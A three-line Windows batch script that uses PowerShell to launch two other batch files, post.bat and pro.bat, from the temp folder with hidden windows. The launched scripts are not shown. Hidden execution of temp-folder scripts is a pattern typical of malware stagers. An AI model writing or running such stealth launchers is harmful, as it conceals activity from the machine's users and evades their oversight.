@echo off
powershell -c "Start-Process -FilePath "%temp%\post.bat" -WindowStyle Hidden"
powershell -c "Start-Process -FilePath "%temp%\pro.bat" -WindowStyle Hidden"
